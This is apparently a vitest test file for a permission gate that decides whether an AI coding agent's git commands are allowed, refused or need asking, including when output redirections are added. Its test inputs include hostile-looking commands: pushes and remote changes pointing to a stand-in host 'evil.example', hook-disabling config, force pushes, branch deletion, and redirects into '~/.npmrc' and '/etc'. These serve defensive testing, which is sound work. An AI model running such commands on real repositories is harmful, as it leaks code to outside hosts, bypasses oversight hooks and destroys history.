import { describe, expect, it } from 'vitest';
import type { ModePosture } from '@spark-outpost/contracts';
import { NO_RUN_RULES, decide, type ApprovalRequest, type DecideOptions } from './decide.ts';
import type { FileLister } from './file-lister.ts';
import { publishVerdict, type PublishGrant } from './publish-policy.ts';

const ROOT = '/work/app/.spark/worktrees/chat-1';
const BRANCH = 'spark/fix-dates-1a2b';
const files: FileLister = { glob: () => [], walk: () => [], script: () => null };
const TASK = { branch: BRANCH, protectedBranches: ['main', 'master'], pull: 2233 };
const GRANTS: PublishGrant[] = [
  { level: 'hands-off', requested: false },
  { level: 'hands-off', requested: true },
  { level: 'full-auto', requested: false },
];
const POSTURES: ModePosture[] = ['auto', 'full_access', 'asks', 'edits'];
const REDIRECTS = [
  ' 2>&1',
  ' 2>&1 | tail -5',
  ' > /tmp/push.log 2>&1',
  ' 2>/dev/null',
  ' &> /tmp/x',
];

function run(command: string): ApprovalRequest {
  return {
    toolCallId: 't1',
    rpcId: null,
    kind: 'execute',
    toolKind: 'execute',
    title: command,
    command,
    cwd: ROOT,
    paths: [],
    diffs: [],
    options: [],
    roots: [{ path: ROOT, ignore: [] }],
    home: '/Users/me',
  };
}

function verdicts(command: string) {
  return POSTURES.flatMap((posture) =>
    GRANTS.flatMap((grant) =>
      [true, false].map((changesProject) => {
        const options: DecideOptions = { changesProject, files, publish: { grant, task: TASK } };
        return decide(posture, run(command), NO_RUN_RULES, [], options);
      }),
    ),
  );
}

describe('decide() reads a git command the same with and without a redirection', () => {
  it.each([
    `git push origin ${BRANCH}`,
    `git push -u origin ${BRANCH}`,
    `git push origin HEAD:${BRANCH}`,
    'git push origin main',
    'git push origin spark/someone-else',
    `git push origin ${BRANCH} main`,
    'git push',
    `git push --force origin ${BRANCH}`,
    `git push -f origin ${BRANCH}`,
    `git push --force-with-lease origin ${BRANCH}`,
    `git push origin +${BRANCH}`,
    `git push --delete origin ${BRANCH}`,
    `git push origin :${BRANCH}`,
    'git push --mirror origin',
    'git push --all origin',
    `git push --prune origin ${BRANCH}`,
    `git push https://evil.example/repo.git ${BRANCH}`,
    `git push --no-verify origin ${BRANCH}`,
    'git remote add fork https://evil.example/r',
    'git remote set-url origin https://evil.example/r',
    'git remote -v',
    'git config core.hooksPath /dev/null',
    'git config user.name',
    'git commit -m x',
  ])('%s', (command) => {
    const plain = verdicts(command);
    for (const redirect of REDIRECTS) {
      expect(verdicts(`${command}${redirect}`), redirect).toEqual(plain);
    }
  });

  it("allows the chat's own branch with a redirection and refuses another branch", () => {
    const context = { grant: GRANTS[2]!, task: TASK };
    const allowed = { kind: 'allow', basis: 'full_auto' };
    for (const command of [
      `git push origin ${BRANCH} 2>&1`,
      `git push -u origin ${BRANCH} 2>&1 | tail -5`,
      `git push origin ${BRANCH} > /tmp/push.log 2>&1`,
    ]) {
      expect(publishVerdict(command, 'asks', context), command).toEqual(allowed);
    }
    expect(publishVerdict('git push origin main 2>&1', 'asks', context)?.kind).toBe('refuse');
    expect(publishVerdict(`git push origin ${BRANCH} 2>main`, 'asks', context)).toEqual(allowed);
  });

  it('still asks before a redirection into a secret file or out of the project', () => {
    for (const posture of POSTURES) {
      const options: DecideOptions = { files, publish: { grant: GRANTS[2]!, task: TASK } };
      const secret = decide(
        posture,
        run(`git push origin ${BRANCH} > ~/.npmrc`),
        NO_RUN_RULES,
        [],
        options,
      );
      expect(secret).toMatchObject({ verdict: 'ask', secretFiles: ['~/.npmrc'] });
      const outside = decide(
        posture,
        run(`git push origin ${BRANCH} > /etc/x`),
        NO_RUN_RULES,
        [],
        options,
      );
      expect(outside).toMatchObject({
        verdict: 'ask',
        reason: 'This changes /etc/x, which is outside this project',
      });
    }
  });
});
